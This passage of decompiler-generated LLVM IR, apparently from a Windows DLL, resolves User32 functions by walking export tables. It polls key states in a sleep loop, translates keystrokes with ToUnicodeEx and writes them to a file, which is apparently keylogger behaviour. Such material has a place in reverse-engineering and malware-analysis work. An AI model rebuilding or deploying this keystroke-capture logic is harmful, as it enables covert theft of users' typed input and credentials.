  %96 = add i32 %esp.0, -28, !insn.addr !754
  %97 = inttoptr i32 %96 to i32*, !insn.addr !754
  store i32 %95, i32* %97, align 4, !insn.addr !754
  %98 = call i32 @"@__security_check_cookie@4"(), !insn.addr !755
  ret i32 %98, !insn.addr !756
}

define i32 @function_10002650() local_unnamed_addr {
dec_label_pc_10002650:
  %storemerge.reg2mem = alloca i32, !insn.addr !757
  %edx.0.reg2mem = alloca i32, !insn.addr !757
  %.pre-phi.reg2mem = alloca i32, !insn.addr !757
  %ecx.2.reg2mem = alloca i32, !insn.addr !757
  %ecx.1.reg2mem = alloca i32, !insn.addr !757
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !757
  %ecx.0.reg2mem = alloca i32, !insn.addr !757
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-140 = alloca i128, align 8
  %stack_var_-236 = alloca i32, align 4
  %1 = call i64 @__decompiler_undefined_function_5()
  %stack_var_-38 = alloca i128, align 8
  %2 = call i128 @__decompiler_undefined_function_4()
  %stack_var_-40 = alloca i16, align 2
  %stack_var_-4 = alloca i32, align 4
  %3 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !758
  %4 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !759
  %5 = xor i32 %4, %3, !insn.addr !760
  store i32 1919251285, i32* @global_var_10040fc0, align 4, !insn.addr !761
  store i32 1680749107, i32* @global_var_10040fc4, align 4, !insn.addr !762
  store i16 27756, i16* bitcast (i32* @global_var_10040fc8 to i16*), align 4, !insn.addr !763
  store i8 0, i8* bitcast (i32* @global_var_10040fca to i8*), align 4, !insn.addr !764
  %6 = load i128, i128* @global_var_1003a020, align 4, !insn.addr !765
  %7 = call i128 @__asm_movaps(i128 %6), !insn.addr !765
  %8 = load i128, i128* bitcast (i32* @global_var_10040fc0 to i128*), align 4, !insn.addr !766
  call void @__asm_movups(i128 %8, i128 %7), !insn.addr !766
  store i32 7827300, i32* @global_var_10040fd0, align 4, !insn.addr !767
  %9 = add i32 %5, 60, !insn.addr !768
  %10 = inttoptr i32 %9 to i32*, !insn.addr !768
  %11 = load i32, i32* %10, align 4, !insn.addr !768
  %12 = add i32 %5, 120, !insn.addr !769
  %13 = add i32 %12, %11, !insn.addr !769
  %14 = inttoptr i32 %13 to i32*, !insn.addr !769
  %15 = load i32, i32* %14, align 4, !insn.addr !769
  %16 = add i32 %15, %5, !insn.addr !770
  %17 = call i32 @function_1000b5e0(i32 %5, i32* nonnull @global_var_10040fc0), !insn.addr !771
  %18 = add i32 %16, 36, !insn.addr !772
  %19 = inttoptr i32 %18 to i32*, !insn.addr !772
  %20 = load i32, i32* %19, align 4, !insn.addr !772
  %21 = mul i32 %17, 2, !insn.addr !773
  %22 = add i32 %21, %5, !insn.addr !773
  %23 = add i32 %22, %20, !insn.addr !774
  %24 = inttoptr i32 %23 to i16*, !insn.addr !774
  %25 = load i16, i16* %24, align 2, !insn.addr !774
  %26 = zext i16 %25 to i32, !insn.addr !774
  %27 = add i32 %16, 28, !insn.addr !775
  %28 = inttoptr i32 %27 to i32*, !insn.addr !775
  %29 = load i32, i32* %28, align 4, !insn.addr !775
  %30 = mul i32 %26, 4, !insn.addr !776
  %31 = add i32 %29, %5, !insn.addr !776
  %32 = add i32 %31, %30, !insn.addr !777
  %33 = inttoptr i32 %32 to i32*, !insn.addr !777
  %34 = load i32, i32* %33, align 4, !insn.addr !777
  %35 = add i32 %34, %5, !insn.addr !778
  %36 = load i128, i128* @global_var_10039ee0, align 4, !insn.addr !779
  %37 = call i128 @__asm_movaps(i128 %36), !insn.addr !779
  %38 = load i128, i128* bitcast (i32* @global_var_10040fc0 to i128*), align 4, !insn.addr !780
  call void @__asm_movups(i128 %38, i128 %37), !insn.addr !780
  store i32 1701015410, i32* @global_var_10040fd0, align 4, !insn.addr !781
  store i32 1682535283, i32* @global_var_10040fd4, align 4, !insn.addr !782
  store i8 0, i8* bitcast (i32* @global_var_10040fd8 to i8*), align 4, !insn.addr !783
  store i32 %35, i32* @global_var_100410b4, align 4, !insn.addr !784
  %39 = call i32 @function_1000b5e0(i32 %5, i32* nonnull @global_var_10040fc0), !insn.addr !785
  %40 = call i32 @_malloc(), !insn.addr !786
  %41 = load i128, i128* @global_var_10039f80, align 4, !insn.addr !787
  %42 = call i128 @__asm_movaps(i128 %41), !insn.addr !787
  store i8 0, i8* bitcast (i32* @global_var_10040fd0 to i8*), align 4, !insn.addr !788
  %43 = load i128, i128* bitcast (i32* @global_var_10040fc0 to i128*), align 4, !insn.addr !789
  call void @__asm_movups(i128 %43, i128 %42), !insn.addr !789
  %44 = call i32 @function_1000a560(), !insn.addr !790
  %45 = load i128, i128* @global_var_1003a0a0, align 4, !insn.addr !791
  %46 = call i128 @__asm_movaps(i128 %45), !insn.addr !791
  store i16 116, i16* bitcast (i32* @global_var_10040fd0 to i16*), align 4, !insn.addr !792
  %47 = load i128, i128* bitcast (i32* @global_var_10040fc0 to i128*), align 4, !insn.addr !793
  call void @__asm_movups(i128 %47, i128 %46), !insn.addr !793
  %48 = call i32 @function_1000a560(), !insn.addr !794
  %sext = mul i32 %0, 65536
  %49 = sdiv i32 %sext, 65536, !insn.addr !795
  %50 = call i128 @__asm_xorps(i128 %46, i128 %46), !insn.addr !796
  store i16 0, i16* %stack_var_-40, align 2, !insn.addr !797
  call void @__asm_movups(i128 %2, i128 %50), !insn.addr !798
  call void @__asm_movq.38(i64 %1, i128 %50), !insn.addr !799
  %51 = call i32 @MapVirtualKeyExW(i32 0, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !800
  %52 = inttoptr i32 %40 to i8*, !insn.addr !801
  %53 = inttoptr i32 %48 to i32*, !insn.addr !802
  %54 = call i32 @ToUnicodeEx(i32 %51, i32 %49, i8* %52, i16* nonnull %stack_var_-40, i32 16, i32 0, i32* %53), !insn.addr !802
  store i32 16, i32* %stack_var_-236, align 4, !insn.addr !803
  %55 = trunc i32 %54 to i16, !insn.addr !804
  %56 = icmp eq i16 %55, 0, !insn.addr !804
  store i32* %stack_var_-236, i32** %esp.0.in.reg2mem, !insn.addr !805
  br i1 %56, label %dec_label_pc_10002893, label %dec_label_pc_10002828, !insn.addr !805

dec_label_pc_10002828:                            ; preds = %dec_label_pc_10002650
  %57 = call i128 @__asm_movaps(i128 7368320664886723658192474275931), !insn.addr !806
  %58 = load i128, i128* %stack_var_-140, align 8, !insn.addr !807
  call void @__asm_movups(i128 %58, i128 %57), !insn.addr !807
  %59 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !808
  %60 = ptrtoint i32* %59 to i32, !insn.addr !808
  %61 = ptrtoint i128* %stack_var_-140 to i32, !insn.addr !809
  store i32 %60, i32* @global_var_1003e9c0, align 4, !insn.addr !810
  store i32 %61, i32* %ecx.0.reg2mem, !insn.addr !811
  br label %dec_label_pc_10002863, !insn.addr !811

dec_label_pc_10002863:                            ; preds = %dec_label_pc_10002863, %dec_label_pc_10002828
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %62 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !812
  %63 = load i16, i16* %62, align 2, !insn.addr !812
  %64 = add i32 %ecx.0.reload, 2, !insn.addr !813
  %65 = icmp eq i16 %63, 0, !insn.addr !814
  %66 = icmp eq i1 %65, false, !insn.addr !815
  store i32 %64, i32* %ecx.0.reg2mem, !insn.addr !815
  br i1 %66, label %dec_label_pc_10002863, label %dec_label_pc_1000286e, !insn.addr !815

dec_label_pc_1000286e:                            ; preds = %dec_label_pc_10002863
  %67 = ptrtoint i32* %stack_var_-138 to i32, !insn.addr !816
  %68 = sub i32 %64, %67, !insn.addr !817
  %69 = bitcast i128* %stack_var_-140 to i32*, !insn.addr !818
  %70 = call i1 @WriteFile(i32* %59, i32* nonnull %69, i32 %68, i32* nonnull @global_var_100410b0, %_OVERLAPPED* null), !insn.addr !818
  %71 = load i32, i32* @global_var_1003e9c0, align 4, !insn.addr !819
  store i32 %71, i32* %stack_var_-288, align 4, !insn.addr !819
  %72 = inttoptr i32 %71 to i32*, !insn.addr !820
  %73 = call i1 @CloseHandle(i32* %72), !insn.addr !820
  store i32* %stack_var_-288, i32** %esp.0.in.reg2mem, !insn.addr !820
  br label %dec_label_pc_10002893, !insn.addr !820

dec_label_pc_10002893:                            ; preds = %dec_label_pc_1000286e, %dec_label_pc_10002650
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %74 = icmp eq i32 %54, 0, !insn.addr !821
  %75 = add i32 %esp.0, -4, !insn.addr !822
  %76 = inttoptr i32 %75 to i32*, !insn.addr !822
  store i32 0, i32* %76, align 4, !insn.addr !822
  %77 = add i32 %esp.0, -8, !insn.addr !823
  %78 = inttoptr i32 %77 to i32*, !insn.addr !823
  store i32 128, i32* %78, align 4, !insn.addr !823
  %79 = add i32 %esp.0, -12, !insn.addr !824
  %80 = inttoptr i32 %79 to i32*, !insn.addr !824
  store i32 4, i32* %80, align 4, !insn.addr !824
  %81 = add i32 %esp.0, -16, !insn.addr !825
  %82 = inttoptr i32 %81 to i32*, !insn.addr !825
  store i32 0, i32* %82, align 4, !insn.addr !825
  %83 = add i32 %esp.0, -20, !insn.addr !826
  %84 = inttoptr i32 %83 to i32*, !insn.addr !826
  store i32 1, i32* %84, align 4, !insn.addr !826
  %85 = add i32 %esp.0, -24, !insn.addr !827
  %86 = inttoptr i32 %85 to i32*, !insn.addr !827
  store i32 4, i32* %86, align 4, !insn.addr !827
  %87 = add i32 %esp.0, -28, !insn.addr !828
  %88 = inttoptr i32 %87 to i32*, !insn.addr !828
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %88, align 4, !insn.addr !828
  br i1 %74, label %dec_label_pc_100028db, label %dec_label_pc_100028b0, !insn.addr !829

dec_label_pc_100028b0:                            ; preds = %dec_label_pc_10002893
  %89 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !830
  %90 = ptrtoint i32* %89 to i32, !insn.addr !830
  %91 = ptrtoint i16* %stack_var_-40 to i32
  store i32 %90, i32* @global_var_1003e9c0, align 4, !insn.addr !831
  store i32 %91, i32* %ecx.1.reg2mem, !insn.addr !832
  br label %dec_label_pc_100028c0, !insn.addr !832

dec_label_pc_100028c0:                            ; preds = %dec_label_pc_100028c0, %dec_label_pc_100028b0
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %92 = inttoptr i32 %ecx.1.reload to i16*, !insn.addr !833
  %93 = load i16, i16* %92, align 2, !insn.addr !833
  %94 = add i32 %ecx.1.reload, 2, !insn.addr !834
  %95 = icmp eq i16 %93, 0, !insn.addr !835
  %96 = icmp eq i1 %95, false, !insn.addr !836
  store i32 %94, i32* %ecx.1.reg2mem, !insn.addr !836
  br i1 %96, label %dec_label_pc_100028c0, label %dec_label_pc_100028cb, !insn.addr !836

dec_label_pc_100028cb:                            ; preds = %dec_label_pc_100028c0
  %97 = ptrtoint i128* %stack_var_-38 to i32, !insn.addr !832
  %98 = sub i32 %94, %97, !insn.addr !837
  %99 = add i32 %esp.0, -32, !insn.addr !838
  %100 = inttoptr i32 %99 to i32*, !insn.addr !838
  store i32 0, i32* %100, align 4, !insn.addr !838
  %101 = add i32 %esp.0, -36, !insn.addr !839
  %102 = inttoptr i32 %101 to i32*, !insn.addr !839
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %102, align 4, !insn.addr !839
  %103 = add i32 %esp.0, -40, !insn.addr !840
  %104 = inttoptr i32 %103 to i32*, !insn.addr !840
  store i32 %98, i32* %104, align 4, !insn.addr !840
  store i32 %91, i32* %.pre-phi.reg2mem, !insn.addr !841
  store i32 %90, i32* %edx.0.reg2mem, !insn.addr !841
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !841
  br label %dec_label_pc_1000290e, !insn.addr !841

dec_label_pc_100028db:                            ; preds = %dec_label_pc_10002893
  %105 = trunc i32 %51 to i16, !insn.addr !842
  %sext6 = mul i16 %105, 256
  %106 = sdiv i16 %sext6, 256, !insn.addr !842
  store i16 %106, i16* %stack_var_-40, align 2, !insn.addr !842
  %107 = zext i16 %106 to i32
  %108 = inttoptr i32 %107 to i16*, !insn.addr !843
  %109 = call i32* @CreateFileW(i16* %108, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !843
  %110 = ptrtoint i32* %109 to i32, !insn.addr !843
  %111 = ptrtoint i16* %stack_var_-40 to i32
  store i32 %110, i32* @global_var_1003e9c0, align 4, !insn.addr !844
  store i32 %111, i32* %ecx.2.reg2mem, !insn.addr !845
  br label %dec_label_pc_100028f4, !insn.addr !845

dec_label_pc_100028f4:                            ; preds = %dec_label_pc_100028f4, %dec_label_pc_100028db
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %112 = inttoptr i32 %ecx.2.reload to i16*, !insn.addr !846
  %113 = load i16, i16* %112, align 2, !insn.addr !846
  %114 = add i32 %ecx.2.reload, 2, !insn.addr !847
  %115 = icmp eq i16 %113, 0, !insn.addr !848
  %116 = icmp eq i1 %115, false, !insn.addr !849
  store i32 %114, i32* %ecx.2.reg2mem, !insn.addr !849
  br i1 %116, label %dec_label_pc_100028f4, label %dec_label_pc_100028ff, !insn.addr !849

dec_label_pc_100028ff:                            ; preds = %dec_label_pc_100028f4
  %117 = ptrtoint i128* %stack_var_-38 to i32, !insn.addr !845
  %118 = sub i32 %114, %117, !insn.addr !850
  %119 = add i32 %esp.0, -32, !insn.addr !851
  %120 = inttoptr i32 %119 to i32*, !insn.addr !851
  store i32 0, i32* %120, align 4, !insn.addr !851
  %121 = add i32 %esp.0, -36, !insn.addr !852
  %122 = inttoptr i32 %121 to i32*, !insn.addr !852
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %122, align 4, !insn.addr !852
  %123 = add i32 %esp.0, -40, !insn.addr !853
  %124 = inttoptr i32 %123 to i32*, !insn.addr !853
  store i32 %118, i32* %124, align 4, !insn.addr !853
  store i32 %111, i32* %.pre-phi.reg2mem, !insn.addr !853
  store i32 %110, i32* %edx.0.reg2mem, !insn.addr !853
  store i32 %123, i32* %storemerge.reg2mem, !insn.addr !853
  br label %dec_label_pc_1000290e, !insn.addr !853

dec_label_pc_1000290e:                            ; preds = %dec_label_pc_100028ff, %dec_label_pc_100028cb
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %125 = add i32 %storemerge.reload, -4, !insn.addr !854
  %126 = inttoptr i32 %125 to i32*, !insn.addr !854
  store i32 %.pre-phi.reload, i32* %126, align 4, !insn.addr !854
  %127 = add i32 %storemerge.reload, -8, !insn.addr !855
  %128 = inttoptr i32 %127 to i32*, !insn.addr !855
  store i32 %edx.0.reload, i32* %128, align 4, !insn.addr !855
  %129 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !856
  %130 = load i32, i32* @global_var_1003e9c0, align 4, !insn.addr !857
  %131 = add i32 %storemerge.reload, -12, !insn.addr !857
  %132 = inttoptr i32 %131 to i32*, !insn.addr !857
  store i32 %130, i32* %132, align 4, !insn.addr !857
  %133 = call i1 @CloseHandle(i32* nonnull @4), !insn.addr !858
  %134 = add i32 %storemerge.reload, -16, !insn.addr !859
  %135 = inttoptr i32 %134 to i32*, !insn.addr !859
  store i32 %40, i32* %135, align 4, !insn.addr !859
  %136 = call i32 @_free(), !insn.addr !860
  %137 = call i32 @"@__security_check_cookie@4"(), !insn.addr !861
  ret i32 %137, !insn.addr !862
}

define i32 @function_10002940() local_unnamed_addr {
dec_label_pc_10002940:
  %esp.0.be.reg2mem = alloca i32, !insn.addr !863
  %esp.6.reg2mem = alloca i32, !insn.addr !863
  %.pre-phi.reg2mem = alloca i32, !insn.addr !863
  %esp.5.reg2mem = alloca i32, !insn.addr !863
  %esp.4.reg2mem = alloca i32, !insn.addr !863
  %edx.6.reg2mem = alloca i32, !insn.addr !863
  %.pn.reg2mem = alloca i32, !insn.addr !863
  %ecx.16.reg2mem = alloca i32, !insn.addr !863
  %ecx.15.reg2mem = alloca i32, !insn.addr !863
  %ecx.14.reg2mem = alloca i32, !insn.addr !863
  %ecx.13.reg2mem = alloca i32, !insn.addr !863
  %ecx.12.reg2mem = alloca i32, !insn.addr !863
  %ecx.11.reg2mem = alloca i32, !insn.addr !863
  %ecx.10.reg2mem = alloca i32, !insn.addr !863
  %ecx.9.reg2mem = alloca i32, !insn.addr !863
  %ecx.8.reg2mem = alloca i32, !insn.addr !863
  %ecx.7.reg2mem = alloca i32, !insn.addr !863
  %ecx.6.reg2mem = alloca i32, !insn.addr !863
  %ecx.5.reg2mem = alloca i32, !insn.addr !863
  %ecx.4.reg2mem = alloca i32, !insn.addr !863
  %esp.3.reg2mem = alloca i32, !insn.addr !863
  %ecx.3.reg2mem = alloca i32, !insn.addr !863
  %eax.2.reg2mem = alloca i32, !insn.addr !863
  %esp.2.reg2mem = alloca i32, !insn.addr !863
  %ecx.0.reg2mem = alloca i32, !insn.addr !863
  %eax.1.reg2mem = alloca i32, !insn.addr !863
  %esp.1.reg2mem = alloca i32, !insn.addr !863
  %eax.0.reg2mem = alloca i32, !insn.addr !863
  %stack_var_-216.0.reg2mem = alloca i16*, !insn.addr !863
  %esp.0.reg2mem = alloca i32, !insn.addr !863
  %stack_var_-106 = alloca i32, align 4
  %stack_var_-108 = alloca i128, align 8
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-208 = alloca i128, align 8
  store i128 1919251285, i128* %stack_var_-208, align 8, !insn.addr !864
  %1 = ptrtoint i128* %stack_var_-208 to i32, !insn.addr !865
  store i32 %1, i32* %stack_var_-240, align 4, !insn.addr !865
  %2 = load i128, i128* @global_var_10039f90, align 4, !insn.addr !866
  %3 = call i128 @__asm_movaps(i128 %2), !insn.addr !866
  call void @__asm_movups(i128 undef, i128 %3), !insn.addr !867
  %4 = add i32 %0, 120, !insn.addr !868
  %5 = add i32 %4, %1, !insn.addr !868
  %6 = inttoptr i32 %5 to i32*, !insn.addr !868
  %7 = load i32, i32* %6, align 4, !insn.addr !868
  %8 = add i32 %7, %1, !insn.addr !869
  %9 = bitcast i128* %stack_var_-208 to i32*, !insn.addr !870
  %10 = call i32 @function_1000b5e0(i32 %1, i32* nonnull %9), !insn.addr !870
  %11 = add i32 %8, 36, !insn.addr !871
  %12 = inttoptr i32 %11 to i32*, !insn.addr !871
  %13 = load i32, i32* %12, align 4, !insn.addr !871
  %14 = load i128, i128* @global_var_1003a020, align 4, !insn.addr !872
  %15 = call i128 @__asm_movaps(i128 %14), !insn.addr !872
  %16 = mul i32 %10, 2, !insn.addr !873
  %17 = add i32 %16, %1, !insn.addr !873
  %18 = add i32 %17, %13, !insn.addr !874
  %19 = inttoptr i32 %18 to i16*, !insn.addr !874
  %20 = load i16, i16* %19, align 2, !insn.addr !874
  %21 = zext i16 %20 to i32, !insn.addr !874
  %22 = add i32 %8, 28, !insn.addr !875
  %23 = inttoptr i32 %22 to i32*, !insn.addr !875
  %24 = load i32, i32* %23, align 4, !insn.addr !875
  %25 = mul i32 %21, 4, !insn.addr !876
  %26 = add i32 %24, %1, !insn.addr !876
  %27 = add i32 %26, %25, !insn.addr !877
  %28 = inttoptr i32 %27 to i32*, !insn.addr !877
  %29 = load i32, i32* %28, align 4, !insn.addr !877
  %30 = add i32 %29, %1, !insn.addr !878
  call void @__asm_movups(i128 undef, i128 %15), !insn.addr !879
  store i32 %30, i32* @global_var_100410bc, align 4, !insn.addr !880
  %31 = call i32 @function_1000b5e0(i32 %1, i32* nonnull %9), !insn.addr !881
  %32 = ptrtoint i32* %stack_var_-240 to i32, !insn.addr !882
  store i128 1467245895, i128* %stack_var_-208, align 8, !insn.addr !883
  %33 = call i32 @function_1000a560(), !insn.addr !884
  %34 = ptrtoint i128* %stack_var_-108 to i32
  %35 = ptrtoint i32* %stack_var_-106 to i32
  %36 = load i128, i128* @global_var_10039d60, align 4
  %37 = load i128, i128* @global_var_10039d80, align 4
  %38 = load i128, i128* @global_var_10039d70, align 4
  %39 = load i128, i128* @global_var_10039d50, align 4
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !885
  br label %dec_label_pc_10002a80, !insn.addr !885

dec_label_pc_10002a80:                            ; preds = %dec_label_pc_10002a80.backedge, %dec_label_pc_10002940
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %40 = add i32 %esp.0.reload, -4, !insn.addr !886
  %41 = inttoptr i32 %40 to i32*, !insn.addr !886
  store i32 30, i32* %41, align 4, !insn.addr !886
  call void @Sleep(i32 %33), !insn.addr !887
  store i16* inttoptr (i32 8 to i16*), i16** %stack_var_-216.0.reg2mem, !insn.addr !888
  store i32 8, i32* %eax.0.reg2mem, !insn.addr !888
  store i32 %40, i32* %esp.1.reg2mem, !insn.addr !888
  br label %dec_label_pc_10002a93, !insn.addr !888

dec_label_pc_10002a93:                            ; preds = %dec_label_pc_1000348f, %dec_label_pc_10002a80
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %stack_var_-216.0.reload = load i16*, i16** %stack_var_-216.0.reg2mem
  %sext = mul i32 %eax.0.reload, 65536
  %42 = sdiv i32 %sext, 65536, !insn.addr !889
  %43 = add i32 %esp.1.reload, -4, !insn.addr !890
  %44 = inttoptr i32 %43 to i32*, !insn.addr !890
  store i32 %42, i32* %44, align 4, !insn.addr !890
  %45 = trunc i32 %42 to i16, !insn.addr !891
  %46 = icmp eq i16 %45, -32767, !insn.addr !891
  %47 = icmp eq i1 %46, false, !insn.addr !892
  br i1 %47, label %dec_label_pc_10002a93.dec_label_pc_1000348f_crit_edge, label %dec_label_pc_10002aa9, !insn.addr !892

dec_label_pc_10002a93.dec_label_pc_1000348f_crit_edge: ; preds = %dec_label_pc_10002a93
  %.pre = ptrtoint i16* %stack_var_-216.0.reload to i32, !insn.addr !893
  store i32 %.pre, i32* %.pre-phi.reg2mem
  store i32 %43, i32* %esp.6.reg2mem
  br label %dec_label_pc_1000348f

dec_label_pc_10002aa9:                            ; preds = %dec_label_pc_10002a93
  store i32 %42, i32* @global_var_100410b4, align 4, !insn.addr !894
  %48 = icmp eq i32 %sext, 0, !insn.addr !895
  store i32 %43, i32* %esp.3.reg2mem, !insn.addr !896
  br i1 %48, label %dec_label_pc_10002c0e, label %dec_label_pc_10002abc, !insn.addr !896

dec_label_pc_10002abc:                            ; preds = %dec_label_pc_10002aa9
  %49 = add i32 %esp.1.reload, -8, !insn.addr !897
  %50 = inttoptr i32 %49 to i32*, !insn.addr !897
  store i32 1024, i32* %50, align 4, !insn.addr !897
  %51 = add i32 %esp.1.reload, -12, !insn.addr !898
  %52 = inttoptr i32 %51 to i32*, !insn.addr !898
  store i32 ptrtoint (i16** @global_var_100405a8 to i32), i32* %52, align 4, !insn.addr !898
  %53 = add i32 %esp.1.reload, -16, !insn.addr !899
  %54 = inttoptr i32 %53 to i32*, !insn.addr !899
  store i32 %42, i32* %54, align 4, !insn.addr !899
  store i32 ptrtoint (i16** @global_var_100405a8 to i32), i32* %eax.1.reg2mem, !insn.addr !900
  store i32 ptrtoint (i16** @global_var_100410c0 to i32), i32* %ecx.0.reg2mem, !insn.addr !900
  br label %dec_label_pc_10002ae0, !insn.addr !900

dec_label_pc_10002ae0:                            ; preds = %dec_label_pc_10002af7, %dec_label_pc_10002abc
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %55 = inttoptr i32 %eax.1.reload to i16*, !insn.addr !901
  %56 = load i16, i16* %55, align 4, !insn.addr !901
  %57 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !902
  %58 = load i16, i16* %57, align 4, !insn.addr !902
  %59 = icmp eq i16 %56, %58, !insn.addr !902
  %60 = icmp eq i1 %59, false, !insn.addr !903
  br i1 %60, label %dec_label_pc_10002b13, label %dec_label_pc_10002ae8, !insn.addr !903

dec_label_pc_10002ae8:                            ; preds = %dec_label_pc_10002ae0
  %61 = icmp eq i16 %56, 0, !insn.addr !904
  store i32 %53, i32* %esp.3.reg2mem, !insn.addr !905
  br i1 %61, label %dec_label_pc_10002c0e, label %dec_label_pc_10002aed, !insn.addr !905

dec_label_pc_10002aed:                            ; preds = %dec_label_pc_10002ae8
  %62 = or i32 %eax.1.reload, 2, !insn.addr !906
  %63 = inttoptr i32 %62 to i16*, !insn.addr !906
  %64 = load i16, i16* %63, align 2, !insn.addr !906
  %65 = or i32 %ecx.0.reload, 2, !insn.addr !907
  %66 = inttoptr i32 %65 to i16*, !insn.addr !907
  %67 = load i16, i16* %66, align 2, !insn.addr !907
  %68 = icmp eq i16 %64, %67, !insn.addr !907
  %69 = icmp eq i1 %68, false, !insn.addr !908
  br i1 %69, label %dec_label_pc_10002b13, label %dec_label_pc_10002af7, !insn.addr !908

dec_label_pc_10002af7:                            ; preds = %dec_label_pc_10002aed
  %70 = add i32 %eax.1.reload, 4, !insn.addr !909
  %71 = add i32 %ecx.0.reload, 4, !insn.addr !910
  %72 = icmp eq i16 %64, 0, !insn.addr !911
  %73 = icmp eq i1 %72, false, !insn.addr !912
  store i32 %70, i32* %eax.1.reg2mem, !insn.addr !912
  store i32 %71, i32* %ecx.0.reg2mem, !insn.addr !912
  store i32 %53, i32* %esp.3.reg2mem, !insn.addr !912
  br i1 %73, label %dec_label_pc_10002ae0, label %dec_label_pc_10002c0e, !insn.addr !912

dec_label_pc_10002b13:                            ; preds = %dec_label_pc_10002aed, %dec_label_pc_10002ae0
  %74 = load i32, i32* @global_var_100405a0, align 4, !insn.addr !913
  %75 = icmp eq i32 %74, 0, !insn.addr !913
  %76 = add i32 %esp.1.reload, -20, !insn.addr !914
  %77 = inttoptr i32 %76 to i32*, !insn.addr !914
  store i32 0, i32* %77, align 4, !insn.addr !914
  %78 = add i32 %esp.1.reload, -24, !insn.addr !915
  %79 = inttoptr i32 %78 to i32*, !insn.addr !915
  store i32 128, i32* %79, align 4, !insn.addr !915
  %80 = add i32 %esp.1.reload, -28
  %81 = inttoptr i32 %80 to i32*
  br i1 %75, label %dec_label_pc_10002b54, label %dec_label_pc_10002b23, !insn.addr !916

dec_label_pc_10002b23:                            ; preds = %dec_label_pc_10002b13
  store i32 2, i32* %81, align 4, !insn.addr !917
  %82 = add i32 %esp.1.reload, -32, !insn.addr !918
  %83 = inttoptr i32 %82 to i32*, !insn.addr !918
  store i32 0, i32* %83, align 4, !insn.addr !918
  %84 = add i32 %esp.1.reload, -36, !insn.addr !919
  %85 = inttoptr i32 %84 to i32*, !insn.addr !919
  store i32 2, i32* %85, align 4, !insn.addr !919
  %86 = add i32 %esp.1.reload, -40, !insn.addr !920
  %87 = inttoptr i32 %86 to i32*, !insn.addr !920
  store i32 2, i32* %87, align 4, !insn.addr !920
  %88 = add i32 %esp.1.reload, -44, !insn.addr !921
  %89 = inttoptr i32 %88 to i32*, !insn.addr !921
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %89, align 4, !insn.addr !921
  %90 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !922
  %91 = ptrtoint i32* %90 to i32, !insn.addr !922
  %92 = add i32 %esp.1.reload, -48, !insn.addr !923
  %93 = inttoptr i32 %92 to i32*, !insn.addr !923
  store i32 0, i32* %93, align 4, !insn.addr !923
  %94 = add i32 %esp.1.reload, -52, !insn.addr !924
  %95 = inttoptr i32 %94 to i32*, !insn.addr !924
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %95, align 4, !insn.addr !924
  %96 = add i32 %esp.1.reload, -56, !insn.addr !925
  %97 = inttoptr i32 %96 to i32*, !insn.addr !925
  store i32 2, i32* %97, align 4, !insn.addr !925
  %98 = add i32 %esp.1.reload, -60, !insn.addr !926
  %99 = inttoptr i32 %98 to i32*, !insn.addr !926
  store i32 ptrtoint (i32* @global_var_1003e9c4 to i32), i32* %99, align 4, !insn.addr !926
  %100 = add i32 %esp.1.reload, -64, !insn.addr !927
  %101 = inttoptr i32 %100 to i32*, !insn.addr !927
  store i32 %91, i32* %101, align 4, !insn.addr !927
  store i32 %91, i32* @global_var_1003e9c0, align 4, !insn.addr !928
